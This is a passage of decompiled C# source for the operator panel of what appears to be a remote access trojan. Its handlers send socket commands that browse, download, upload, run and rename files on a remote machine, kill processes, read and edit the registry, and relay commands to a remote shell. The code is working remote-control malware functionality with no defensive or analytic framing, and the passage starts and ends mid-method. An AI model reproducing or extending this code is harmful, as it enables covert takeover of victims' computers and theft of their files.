					this._ToolStripMenuItem1.Click += eventHandler;
				}
			}
		}

		// Token: 0x060003C8 RID: 968 RVA: 0x001662F0 File Offset: 0x001646F0
		public Manager()
		{
			base.FormClosing += this.Manager_FormClosing;
			base.Load += this.Manager_Load;
			base.Resize += this.Manager_Resize;
			Manager.__ENCAddToList(this);
			this.RGCH = new Collection();
			this.string_0 = string.Empty;
			this.Images = new Collection();
			this.Cache = new Collection();
			this.isCut = false;
			this.Flist = string.Empty;
			this.TCPFX = true;
			this.PRFX = true;
			this.SrvFX = true;
			this.srvNxt = true;
			this.PID = 0;
			this.PRNXT = true;
			this.TCPNXT = true;
			this.string_1 = new string[5];
			this.int_0 = 0;
			this.int_1 = 0;
			this.cur = Manager.CR.fm;
			this.shStarted = 0;
			this.InitializeComponent();
		}

		// Token: 0x060003C9 RID: 969 RVA: 0x001663E8 File Offset: 0x001647E8
		public void exp(string x, bool Refresh = false)
		{
			try
			{
				string text = x.Replace("\\\\", "\\");
				bool flag = !text.EndsWith("\\");
				if (flag)
				{
					text += "\\";
				}
				this.TextBox1.Text = text;
				ToolStripProgressBar pr = this.pr;
				ToolStripProgressBar toolStripProgressBar = pr;
				lock (toolStripProgressBar)
				{
					this.p.Image = null;
					this.p.Visible = false;
					this.TextBox1.BackColor = Color.IndianRed;
					flag = Refresh && this.Cache.Contains(text);
					if (flag)
					{
						this.Cache.Remove(text);
					}
					flag = this.Cache.Contains(text);
					if (flag)
					{
						this.TextBox1.BackColor = Color.Pink;
						Manager.GClass14 gclass = (Manager.GClass14)this.Cache[text];
						this.pr.Value = 0;
						this.pr.Maximum = gclass.list_1.Count + gclass.list_0.Count;
						this.L2.Items.Clear();
						flag = new DirectoryInfo(text).Parent != null;
						if (flag)
						{
							ListViewItem listViewItem = this.L2.Items.Add("..", "..", 0);
							listViewItem.SubItems.Add(string.Empty);
							listViewItem.SubItems.Add("DIR");
							listViewItem.ToolTipText = new DirectoryInfo(text).Parent.FullName + "\\";
						}
						try
						{
							foreach (string text2 in gclass.list_0)
							{
								ToolStripProgressBar toolStripProgressBar2 = this.pr;
								ToolStripProgressBar toolStripProgressBar3 = toolStripProgressBar2;
								toolStripProgressBar3.Value++;
								ListViewItem listViewItem2 = this.L2.Items.Add(text2, new DirectoryInfo(text2).Name, 0);
								listViewItem2.SubItems.Add(string.Empty);
								listViewItem2.SubItems.Add("DIR");
								listViewItem2.ToolTipText = text2;
							}
						}
						finally
						{
							
						}
						List<ListViewItem> list = new List<ListViewItem>();
						bool flag2;
						try
						{
							foreach (string text3 in gclass.list_1)
							{
								ToolStripProgressBar toolStripProgressBar2 = this.pr;
								ToolStripProgressBar toolStripProgressBar3 = toolStripProgressBar2;
								toolStripProgressBar3.Value++;
								string[] array = Strings.Split(text3, "*", -1, CompareMethod.Binary);
								FileInfo fileInfo = new FileInfo(array[0]);
								ListViewItem listViewItem3 = new ListViewItem(fileInfo.Name, 1);
								ListViewItem listViewItem4 = listViewItem3;
								listViewItem4.ToolTipText = fileInfo.FullName;
								listViewItem4.SubItems.Add(array[1]);
								listViewItem4.SubItems.Add(array[2]);
								listViewItem4.Name = listViewItem4.ToolTipText;
								flag = this.Images.Contains("!" + listViewItem4.ToolTipText);
								if (flag)
								{
									try
									{
										flag2 = !this.vmethod_108.Images.ContainsKey(listViewItem4.ToolTipText);
										if (flag2)
										{
											object[] array2 = new object[2];
											ListViewItem listViewItem5 = listViewItem4;
											array2[0] = listViewItem5.ToolTipText;
											array2[1] = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(this.Images[listViewItem4.ToolTipText])));
											object[] array3 = array2;
											bool[] array4 = new bool[] { true, false };
											NewLateBinding.LateCall(this.vmethod_108.Images, null, "Add", array3, null, null, array4, true);
											flag2 = array4[0];
											if (flag2)
											{
												listViewItem5.ToolTipText = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array3[0]))), typeof(string)));
											}
										}
									}
									catch (Exception ex)
									{
									}
									listViewItem4.ImageKey = listViewItem4.ToolTipText;
								}
								else
								{
									flag2 = fileInfo.Extension.Length > 0;
									if (flag2)
									{
										flag = !this.vmethod_108.Images.ContainsKey(fileInfo.Extension);
										if (flag)
										{
											File.Create(Application.StartupPath + "\\!" + fileInfo.Extension).Close();
											this.vmethod_108.Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + "\\!" + fileInfo.Extension));
											File.Delete(Application.StartupPath + "\\!" + fileInfo.Extension);
											listViewItem4.ImageKey = fileInfo.Extension;
										}
										else
										{
											listViewItem4.ImageKey = fileInfo.Extension;
										}
									}
								}
								listViewItem4 = null;
								list.Add(listViewItem3);
								flag2 = list.Count > 20;
								if (flag2)
								{
									this.L2.Items.AddRange(list.ToArray());
									list.Clear();
								}
							}
						}
						finally { }
							
						flag2 = list.Count > 0;
						if (flag2)
						{
							this.L2.Items.AddRange(list.ToArray());
							list.Clear();
						}
						this.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
						this.pr.Value = 0;
					}
					else
					{
						this.sk.Send(string.Concat(new string[]
						{
							"Ex",
							Class7.string_1,
							"fm",
							Class7.string_1,
							"!",
							Class7.string_1,
							Class6.smethod_14(ref text)
						}));
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x060003CA RID: 970 RVA: 0x00166A9C File Offset: 0x00164E9C
		private void Manager_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				this.Images.Clear();
			}
			catch (Exception ex)
			{
			}
			try
			{
				this.Cache.Clear();
			}
			catch (Exception ex2)
			{
			}
			bool flag = this.sk != null && this.sk.CN;
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"rs",
					Class7.string_1,
					"@"
				}));
			}
		}

		// Token: 0x060003CB RID: 971 RVA: 0x00166B6C File Offset: 0x00164F6C
		private void Manager_Load(object sender, EventArgs e)
		{
			try
			{
				this.LPR.Tag = null;
				this.LTCP.Tag = null;
				this.RGk.Nodes.Add("HKEY_CLASSES_ROOT", "HKEY_CLASSES_ROOT");
				this.RGk.Nodes.Add("HKEY_CURRENT_USER", "HKEY_CURRENT_USER");
				this.RGk.Nodes.Add("HKEY_LOCAL_MACHINE", "HKEY_LOCAL_MACHINE");
				this.RGk.Nodes.Add("HKEY_USERS", "HKEY_USERS");
				this.L2.Controls.Add(this.p);
				this.ListView1.Items[0].Selected = true;
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"proc",
					Class7.string_1,
					"~"
				}));
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"fm",
					Class7.string_1,
					"~"
				}));
				this.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(this.sk.L)));
				this.L2.Controls.Add(this.p);
				this.p.Visible = false;
				try
				{
					this.string_0 = this.sk.Folder + "Downloads\\";
				}
				catch (Exception ex)
				{
				}
				this.vmethod_26.Enabled = true;
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x060003CC RID: 972 RVA: 0x00166D84 File Offset: 0x00165184
		private void Manager_Resize(object sender, EventArgs e)
		{
			this.p.Left = this.L2.Width - this.p.Width - 25;
			this.p.Top = this.L2.Height - this.p.Height - 25;
		}

		// Token: 0x060003CD RID: 973 RVA: 0x00166DE0 File Offset: 0x001651E0
		private void KillToolStripMenuItem1_Click(object sender, EventArgs e)
		{
			string text = string.Empty;
			bool flag;
			try
			{
				foreach (object obj in this.LPR.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = text + Class7.string_1 + listViewItem.SubItems[1].Text;
				}
			}
			finally
			{
				
			}
			flag = text.Length > 0;
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"proc",
					Class7.string_1,
					"k",
					text
				}));
			}
		}

		// Token: 0x060003CE RID: 974 RVA: 0x00166ECC File Offset: 0x001652CC
		private void KillDeleteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = string.Empty;
			bool flag;
			try
			{
				foreach (object obj in this.LPR.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = string.Concat(new string[]
					{
						text,
						Class7.string_1,
						listViewItem.SubItems[1].Text,
						"::",
						listViewItem.ToolTipText
					});
				}
			}
			finally
			{
				
			}
			flag = text.Length > 0;
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"proc",
					Class7.string_1,
					"kd",
					text
				}));
			}
		}

		// Token: 0x060003CF RID: 975 RVA: 0x00166FE0 File Offset: 0x001653E0
		private void RefreshToolStripMenuItem2_Click(object sender, EventArgs e)
		{
			bool flag = this.TextBox1.Text.Length > 0;
			if (flag)
			{
				this.exp(this.TextBox1.Text, true);
			}
		}

		// Token: 0x060003D0 RID: 976 RVA: 0x0016701C File Offset: 0x0016541C
		private void EditToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.RGLIST_DoubleClick(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e);
		}

		// Token: 0x060003D1 RID: 977 RVA: 0x00167038 File Offset: 0x00165438
		private void RGLIST_DoubleClick(object sender, EventArgs e)
		{
			bool flag = this.RGLIST.SelectedItems.Count != 0;
			if (flag)
			{
				ListViewItem listViewItem = this.RGLIST.SelectedItems[0];
				RGv rgv = new RGv
				{
					Path = this.RGk.SelectedNode.FullPath + "\\",
					sk = this.sk
				};
				rgv.TextBox1.Text = listViewItem.Text;
				rgv.ComboBox1.SelectedIndex = rgv.ComboBox1.Items.IndexOf(listViewItem.SubItems[1].Text);
				try
				{
					rgv.TextBox3.Text = listViewItem.SubItems[2].Text;
				}
				catch (Exception ex)
				{
				}
				rgv.Text = rgv.Path;
				rgv.TextBox1.ReadOnly = true;
				rgv.ShowDialog(this);
			}
		}

		// Token: 0x060003D2 RID: 978 RVA: 0x00167150 File Offset: 0x00165550
		private void NewValueToolStripMenuItem_Click(object sender, EventArgs e)
		{
			RGv rgv = new RGv
			{
				Path = this.RGk.SelectedNode.FullPath + "\\",
				sk = this.sk
			};
			rgv.TextBox1.Text = "Name";
			rgv.ComboBox1.SelectedIndex = rgv.ComboBox1.Items.IndexOf("String");
			rgv.TextBox3.Text = "Value";
			rgv.Text = rgv.Path;
			rgv.ShowDialog(this);
		}

		// Token: 0x060003D3 RID: 979 RVA: 0x001671EC File Offset: 0x001655EC
		private void T2_KeyDown(object sender, KeyEventArgs e)
		{
			Keys keyCode = e.KeyCode;
			bool flag = keyCode == Keys.Return;
			if (flag)
			{
				string text = this.T2.Text;
				this.T2.Text = string.Empty;
				e.SuppressKeyPress = true;
				this.string_1[this.int_1] = text;
				this.int_1++;
				flag = this.int_1 > this.string_1.Length - 1;
				if (flag)
				{
					this.int_1 = 0;
				}
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"rs",
					Class7.string_1,
					"!",
					Class7.string_1,
					Class6.smethod_14(ref text)
				}));
			}
			else
			{
				flag = keyCode == Keys.Down;
				if (flag)
				{
					this.int_0 += -1;
					flag = this.int_0 < 0;
					if (flag)
					{
						this.int_0 = 0;
					}
					this.T2.Text = this.string_1[this.int_0];
				}
				else
				{
					flag = keyCode == Keys.Up;
					if (flag)
					{
						this.int_0++;
						flag = this.int_0 > this.string_1.Length - 1;
						if (flag)
						{
							this.int_0 = this.string_1.Length - 1;
						}
						this.T2.Text = this.string_1[this.int_0];
					}
				}
			}
		}

		// Token: 0x060003D4 RID: 980 RVA: 0x0016737C File Offset: 0x0016577C
		private void sh_Resize(object sender, EventArgs e)
		{
			this.T1.ScrollToCaret();
		}

		// Token: 0x060003D5 RID: 981 RVA: 0x0016738C File Offset: 0x0016578C
		private void RGk_AfterCollapse(object sender, TreeViewEventArgs e)
		{
			bool flag = this.RGCH.Contains(e.Node.FullPath + "\\");
			Manager.GClass13 gclass = null;
			if (flag)
			{
				gclass = (Manager.GClass13)this.RGCH[e.Node.FullPath + "\\"];
			}
			flag = gclass == null;
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"RG",
					Class7.string_1,
					"~",
					Class7.string_1,
					e.Node.FullPath,
					"\\"
				}));
			}
			else
			{
				flag = (gclass.list_0.Count == 0) & (gclass.list_1.Count == 0);
				if (flag)
				{
					this.RGLIST.Items.Clear();
					this.RGk.Enabled = false;
					this.RGLIST.Enabled = false;
					this.sk.Send(string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"RG",
						Class7.string_1,
						"~",
						Class7.string_1,
						e.Node.FullPath,
						"\\"
					}));
				}
				else
				{
					this.RGLIST.Items.Clear();
					try
					{
						foreach (string[] array in gclass.list_0)
						{
							ListViewItem listViewItem = this.RGLIST.Items.Add(array[0]);
							listViewItem.SubItems.Add(array[1]);
							listViewItem.SubItems.Add(array[2]);
							flag = Operators.CompareString(array[1], "String", false) == 0;
							if (flag)
							{
								listViewItem.ImageIndex = 1;
							}
							else
							{
								listViewItem.ImageIndex = 2;
							}
						}
					}
					finally
					{ }
						
					this.RGLIST.method_3();
				}
			}
		}

		// Token: 0x060003D6 RID: 982 RVA: 0x001675E4 File Offset: 0x001659E4
		private void RGk_AfterExpand(object sender, TreeViewEventArgs e)
		{
			bool flag = this.RGCH.Contains(e.Node.FullPath + "\\");
			Manager.GClass13 gclass = null;
			if (flag)
			{
				gclass = (Manager.GClass13)this.RGCH[e.Node.FullPath + "\\"];
			}
			flag = gclass == null;
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"RG",
					Class7.string_1,
					"~",
					Class7.string_1,
					e.Node.FullPath,
					"\\"
				}));
			}
			else
			{
				flag = (gclass.list_0.Count == 0) & (gclass.list_1.Count == 0);
				if (flag)
				{
					this.RGLIST.Items.Clear();
					this.RGk.Enabled = false;
					this.RGLIST.Enabled = false;
					this.sk.Send(string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"RG",
						Class7.string_1,
						"~",
						Class7.string_1,
						e.Node.FullPath,
						"\\"
					}));
				}
				else
				{
					this.RGLIST.Items.Clear();
					try
					{
						foreach (string[] array in gclass.list_0)
						{
							ListViewItem listViewItem = this.RGLIST.Items.Add(array[0]);
							listViewItem.SubItems.Add(array[1]);
							listViewItem.SubItems.Add(array[2]);
							flag = Operators.CompareString(array[1], "String", false) == 0;
							if (flag)
							{
								listViewItem.ImageIndex = 1;
							}
							else
							{
								listViewItem.ImageIndex = 2;
							}
						}
					}
					finally
					{
						
					}
					this.RGLIST.method_3();
				}
			}
		}

		// Token: 0x060003D7 RID: 983 RVA: 0x0016783C File Offset: 0x00165C3C
		private void RGk_AfterSelect(object sender, TreeViewEventArgs e)
		{
			bool flag = this.RGCH.Contains(e.Node.FullPath + "\\");
			Manager.GClass13 gclass = null;
			if (flag)
			{
				gclass = (Manager.GClass13)this.RGCH[e.Node.FullPath + "\\"];
			}
			flag = gclass == null;
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"RG",
					Class7.string_1,
					"~",
					Class7.string_1,
					e.Node.FullPath,
					"\\"
				}));
			}
			else
			{
				flag = (gclass.list_0.Count == 0) & (gclass.list_1.Count == 0);
				if (flag)
				{
					this.RGLIST.Items.Clear();
					this.RGk.Enabled = false;
					this.RGLIST.Enabled = false;
					this.sk.Send(string.Concat(new string[]
					{
						"Ex",
						Class7.string_1,
						"RG",
						Class7.string_1,
						"~",
						Class7.string_1,
						e.Node.FullPath,
						"\\"
					}));
				}
				else
				{
					this.RGLIST.Items.Clear();
					try
					{
						foreach (string[] array in gclass.list_0)
						{
							ListViewItem listViewItem = this.RGLIST.Items.Add(array[0]);
							listViewItem.SubItems.Add(array[1]);
							listViewItem.SubItems.Add(array[2]);
							flag = Operators.CompareString(array[1], "String", false) == 0;
							if (flag)
							{
								listViewItem.ImageIndex = 1;
							}
							else
							{
								listViewItem.ImageIndex = 2;
							}
						}
					}
					finally
					{
						
					}
					this.RGLIST.method_3();
					flag = !e.Node.IsExpanded;
					if (flag)
					{
						e.Node.Expand();
					}
				}
			}
		}

		// Token: 0x060003D8 RID: 984 RVA: 0x00167AB4 File Offset: 0x00165EB4
		private void RestartProcessToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = string.Empty;
			bool flag;
			try
			{
				foreach (object obj in this.LPR.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text = string.Concat(new string[]
					{
						text,
						Class7.string_1,
						listViewItem.SubItems[1].Text,
						"::",
						listViewItem.ToolTipText,
						"::",
						listViewItem.SubItems[4].Text
					});
				}
			}
			finally
			{
				
			}
			flag = text.Length > 0;
			if (flag)
			{
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"proc",
					Class7.string_1,
					"re",
					text
				}));
			}
		}

		// Token: 0x060003D9 RID: 985 RVA: 0x00167BE4 File Offset: 0x00165FE4
		private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.RGk.SelectedNode != null;
			if (flag)
			{
				this.RGk.Enabled = false;
				this.RGLIST.Enabled = false;
				this.sk.Send(string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"RG",
					Class7.string_1,
					"~",
					Class7.string_1,
					this.RGk.SelectedNode.FullPath,
					"\\"
				}));
			}
		}

		// Token: 0x060003DA RID: 986 RVA: 0x00167C94 File Offset: 0x00166094
		private void L2_DoubleClick(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count != 0;
			if (flag)
			{
				bool flag2 = Operators.CompareString(this.L2.SelectedItems[0].SubItems[2].Text, "DIR", false) == 0;
				if (flag2)
				{
					this.exp(this.L2.SelectedItems[0].ToolTipText, false);
				}
				else
				{
					string[] array = new string[7];
					array[0] = "Ex";
					array[1] = Class7.string_1;
					array[2] = "fm";
					array[3] = Class7.string_1;
					array[4] = "rd";
					array[5] = Class7.string_1;
					ListViewItem listViewItem = this.L2.SelectedItems[0];
					string toolTipText = listViewItem.ToolTipText;
					listViewItem.ToolTipText = toolTipText;
					array[6] = Class6.smethod_14(ref toolTipText);
					this.sk.Send(string.Concat(array));
				}
			}
		}

		// Token: 0x060003DB RID: 987 RVA: 0x00167D94 File Offset: 0x00166194
		private void L2_SelectedIndexChanged(object sender, EventArgs e)
		{
			this.p.Image = null;
			this.p.Visible = false;
			bool flag = this.L2.SelectedItems.Count == 1;
			if (flag)
			{
				ListViewItem listViewItem = this.L2.SelectedItems[0];
				flag = this.Images.Contains(listViewItem.ToolTipText);
				if (flag)
				{
					this.p.Image = (Image)this.Images[listViewItem.ToolTipText];
					this.p.Visible = true;
				}
				else
				{
					flag = listViewItem.SubItems[2].Text.Length > 0 && ".jpg.jpeg.png.ico.bmp.tiff.gif".Contains(listViewItem.SubItems[2].Text.ToLower());
					if (flag)
					{
						string[] array = new string[11];
						array[0] = "Ex";
						array[1] = Class7.string_1;
						array[2] = "fm";
						array[3] = Class7.string_1;
						array[4] = "#";
						array[5] = Class7.string_1;
						ListViewItem listViewItem2 = listViewItem;
						string toolTipText = listViewItem2.ToolTipText;
						listViewItem2.ToolTipText = toolTipText;
						array[6] = Class6.smethod_14(ref toolTipText);
						array[7] = Class7.string_1;
						array[8] = Conversions.ToString(this.p.Width);
						array[9] = Class7.string_1;
						array[10] = Conversions.ToString(this.p.Height);
						this.sk.Send(string.Concat(array));
					}
				}
			}
		}

		// Token: 0x060003DC RID: 988 RVA: 0x00167F28 File Offset: 0x00166328
		private void UPToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.Items.ContainsKey("..");
			if (flag)
			{
				this.exp(this.L2.Items[".."].ToolTipText, false);
			}
		}

		// Token: 0x060003DD RID: 989 RVA: 0x00167F74 File Offset: 0x00166374
		private void RunToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count > 0;
			if (flag)
			{
				string text = string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"fm",
					Class7.string_1,
					"rn"
				});
				try
				{
					foreach (object obj in this.L2.SelectedItems)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						string toolTipText = listViewItem.ToolTipText;
						listViewItem.ToolTipText = toolTipText;
						text = text + Class7.string_1 + Class6.smethod_14(ref toolTipText);
					}
				}
				finally
				{
					
				}
				this.sk.Send(text);
			}
		}

		// Token: 0x060003DE RID: 990 RVA: 0x00168070 File Offset: 0x00166470
		private void RenameToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L2.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					bool flag = Operators.CompareString(listViewItem.Text, "..", false) != 0;
					if (flag)
					{
						bool flag2 = Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) == 0;
						if (flag2)
						{
							string text = Interaction.InputBox(string.Empty, "Rename", listViewItem.Text, -1, -1);
							flag2 = text.Length > 0;
							if (flag2)
							{
								Client client = this.sk;
								string[] array = new string[7];
								array[0] = "Ex";
								array[1] = Class7.string_1;
								array[2] = "fm";
								array[3] = Class7.string_1;
								array[4] = "nm";
								array[5] = Class7.string_1;
								string[] array2 = array;
								int num = 6;
								string text2 = listViewItem.ToolTipText + "*" + text + "*!";
								array2[num] = Class6.smethod_14(ref text2);
								client.Send(string.Concat(array));
							}
						}
						else
						{
							string text3 = Interaction.InputBox(string.Empty, "Rename", listViewItem.Text, -1, -1);
							flag2 = text3.Length > 0;
							if (flag2)
							{
								Client client2 = this.sk;
								string[] array = new string[7];
								array[0] = "Ex";
								array[1] = Class7.string_1;
								array[2] = "fm";
								array[3] = Class7.string_1;
								array[4] = "nm";
								array[5] = Class7.string_1;
								string[] array3 = array;
								int num2 = 6;
								string text2 = listViewItem.ToolTipText + "*" + text3 + "*";
								array3[num2] = Class6.smethod_14(ref text2);
								client2.Send(string.Concat(array));
							}
						}
					}
				}
			}
			finally
			{
				
			}
		}

		// Token: 0x060003DF RID: 991 RVA: 0x00168288 File Offset: 0x00166688
		private void SL_Click(object sender, EventArgs e)
		{
			this.SL.Text = string.Empty;
		}

		// Token: 0x060003E0 RID: 992 RVA: 0x001682A0 File Offset: 0x001666A0
		private void CopyToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = string.Empty;
			bool flag;
			try
			{
				foreach (object obj in this.L2.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					flag = Operators.CompareString(listViewItem.Text, "..", false) != 0 && Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0;
					if (flag)
					{
						text = text + "*" + listViewItem.ToolTipText;
					}
				}
			}
			finally
			{
				
			}
			flag = Operators.CompareString(text, string.Empty, false) != 0;
			if (flag)
			{
				this.Flist = text.Remove(0, 1);
				this.isCut = false;
			}
		}

		// Token: 0x060003E1 RID: 993 RVA: 0x0016838C File Offset: 0x0016678C
		private void CutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = string.Empty;
			bool flag;
			try
			{
				foreach (object obj in this.L2.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					flag = Operators.CompareString(listViewItem.Text, "..", false) != 0 && Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0;
					if (flag)
					{
						text = text + "*" + listViewItem.ToolTipText;
					}
				}
			}
			finally
			{
				
			}
			flag = Operators.CompareString(text, string.Empty, false) != 0;
			if (flag)
			{
				this.Flist = text.Remove(0, 1);
				this.isCut = true;
			}
		}

		// Token: 0x060003E2 RID: 994 RVA: 0x00168478 File Offset: 0x00166878
		private void PasteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = Operators.CompareString(this.Flist, string.Empty, false) != 0;
			if (flag)
			{
				bool flag2 = this.isCut;
				if (flag2)
				{
					Client client = this.sk;
					string[] array = new string[9];
					array[0] = "Ex";
					array[1] = Class7.string_1;
					array[2] = "fm";
					array[3] = Class7.string_1;
					array[4] = "mv";
					array[5] = Class7.string_1;
					string[] array2 = array;
					int num = 6;
					string text = (this.TextBox1.Text + "\\").Replace("\\\\", "\\");
					array2[num] = Class6.smethod_14(ref text);
					array[7] = Class7.string_1;
					array[8] = Class6.smethod_14(ref this.Flist);
					client.Send(string.Concat(array));
				}
				else
				{
					Client client2 = this.sk;
					string[] array = new string[9];
					array[0] = "Ex";
					array[1] = Class7.string_1;
					array[2] = "fm";
					array[3] = Class7.string_1;
					array[4] = "cp";
					array[5] = Class7.string_1;
					string[] array3 = array;
					int num2 = 6;
					string text = (this.TextBox1.Text + "\\").Replace("\\\\", "\\");
					array3[num2] = Class6.smethod_14(ref text);
					array[7] = Class7.string_1;
					array[8] = Class6.smethod_14(ref this.Flist);
					client2.Send(string.Concat(array));
				}
			}
		}

		// Token: 0x060003E3 RID: 995 RVA: 0x001685EC File Offset: 0x001669EC
		private void DownloadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in this.L2.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					bool flag = Operators.CompareString(listViewItem.Text, "..", false) != 0 && Operators.CompareString(listViewItem.SubItems[2].Text, "DIR", false) != 0;
					if (flag)
					{
						string[] array = new string[9];
						array[0] = "Ex";
						array[1] = Class7.string_1;
						array[2] = "fm";
						array[3] = Class7.string_1;
						array[4] = "dw";
						array[5] = Class7.string_1;
						ListViewItem listViewItem2 = listViewItem;
						string toolTipText = listViewItem2.ToolTipText;
						listViewItem2.ToolTipText = toolTipText;
						array[6] = Class6.smethod_14(ref toolTipText);
						array[7] = Class7.string_1;
						array[8] = this.sk.ip();
						this.sk.Send(string.Concat(array));
					}
				}
			}
			finally
			{
				
			}
		}

		// Token: 0x060003E4 RID: 996 RVA: 0x00168728 File Offset: 0x00166B28
		private void UploadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				bool flag = this.L2.Items.Count == 0;
				if (!flag)
				{
					string text = this.TextBox1.Text;
					OpenFileDialog openFileDialog = new OpenFileDialog();
					openFileDialog.FileName = string.Empty;
					openFileDialog.Multiselect = true;
					flag = openFileDialog.ShowDialog() == DialogResult.OK;
					if (flag)
					{
						string[] fileNames = openFileDialog.FileNames;
						int num = 0;
						int num2 = fileNames.Length - 1;
						int num3 = num;
						for (;;)
						{
							int num4 = num3;
							int num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							string text2 = fileNames[num3];
							flag = FileSystem.FileLen(text2) != 0L;
							if (flag)
							{
								up up = new up();
								up.TMP = text2;
								up.FN = (text + "\\" + new FileInfo(text2).Name).Replace("\\\\", "\\");
								up.Name = this.sk.ip() + Class6.smethod_14(ref up.FN);
								up.osk = this.sk;
								up.SZ = (int)FileSystem.FileLen(up.TMP);
								up.Text = new FileInfo(up.TMP).Name + " >> " + up.FN;
								up.Show();
							}
							num3++;
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060003E5 RID: 997 RVA: 0x001688B8 File Offset: 0x00166CB8
		private void NewEmptyFileToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("File Name?", "New File", "New Text.txt", -1, -1);
			bool flag = text.Length != 0;
			if (flag)
			{
				Client client = this.sk;
				string[] array = new string[7];
				array[0] = "Ex";
				array[1] = Class7.string_1;
				array[2] = "fm";
				array[3] = Class7.string_1;
				array[4] = "nf";
				array[5] = Class7.string_1;
				string[] array2 = array;
				int num = 6;
				string text2 = this.TextBox1.Text + text;
				array2[num] = Class6.smethod_14(ref text2);
				client.Send(string.Concat(array));
			}
		}

		// Token: 0x060003E6 RID: 998 RVA: 0x0016895C File Offset: 0x00166D5C
		private void NewFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string text = Interaction.InputBox("Folder Name?", "New Folder", "New Folder", -1, -1);
			bool flag = text.Length != 0;
			if (flag)
			{
				Client client = this.sk;
				string[] array = new string[7];
				array[0] = "Ex";
				array[1] = Class7.string_1;
				array[2] = "fm";
				array[3] = Class7.string_1;
				array[4] = "nd";
				array[5] = Class7.string_1;
				string[] array2 = array;
				int num = 6;
				string text2 = this.TextBox1.Text + text;
				array2[num] = Class6.smethod_14(ref text2);
				client.Send(string.Concat(array));
			}
		}

		// Token: 0x060003E7 RID: 999 RVA: 0x00168A00 File Offset: 0x00166E00
		private void OpenDownloadsToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = !Directory.Exists(this.string_0);
			if (flag)
			{
				Directory.CreateDirectory(this.string_0);
			}
			try
			{
				Process.Start(this.string_0);
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060003E8 RID: 1000 RVA: 0x00168A60 File Offset: 0x00166E60
		private void RarToolStripMenuItem_Click(object sender, EventArgs e)
		{
			bool flag = this.L2.SelectedItems.Count != 0;
			if (flag)
			{
				string text = string.Concat(new string[]
				{
					"Ex",
					Class7.string_1,
					"fm",
					Class7.string_1,
					"rar",
					Class7.string_1
				});
				string text2 = Interaction.InputBox("Enter Rar Name", string.Empty, new DirectoryInfo(this.TextBox1.Text).Name + ".rar", -1, -1);
				flag = Operators.CompareString(text2, string.Empty, false) != 0;
				if (flag)
				{
					TextBox textBox = this.TextBox1;
					string text3 = textBox.Text;
					textBox.Text = text3;
					text = string.Concat(new string[]
					{
						text,
						Class6.smethod_14(ref text2),
						Class7.string_1,
						Class6.smethod_14(ref text3),
						Class7.string_1
					});
					string text4 = "a -y \"" + text2 + "\"";
					try
					{
						foreach (object obj in this.L2.SelectedItems)
						{
